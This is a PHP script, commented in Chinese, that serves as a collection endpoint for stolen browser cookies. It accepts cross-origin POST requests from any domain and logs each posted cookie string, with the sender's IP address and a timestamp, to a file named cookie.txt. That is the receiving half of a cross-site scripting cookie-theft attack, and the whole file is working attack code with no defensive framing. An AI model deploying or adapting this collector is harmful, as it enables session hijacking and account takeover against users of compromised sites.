<?php
// 跨域请求核心响应头设置
header("Access-Control-Allow-Origin: *"); // 允许所有域名跨域
header("Access-Control-Allow-Methods: POST, OPTIONS"); // 允许的请求方法
header("Access-Control-Allow-Headers: Content-Type"); // 允许的请求头
header("Content-Type: text/plain"); // 响应内容类型

// 处理预检请求（Preflight）
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    // 预检请求缓存时间（秒）
    header("Access-Control-Max-Age: 86400");
    exit;
}

// 正式处理 POST 请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 获取原始 POST 数据（避免 URL 编码问题）
    $cookie = file_get_contents('php://input');
    
    // 日志文件路径
    $filePath = __DIR__ . '/cookie.txt';
    
    // 格式化日志内容
    $logContent = sprintf(
        "[%s][IP:%s] %s\n",
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'],
        $cookie
    );
    
    // 写入文件
    if (file_put_contents($filePath, $logContent, FILE_APPEND | LOCK_EX)) {
        http_response_code(200);
    } 
    exit;
}
?>



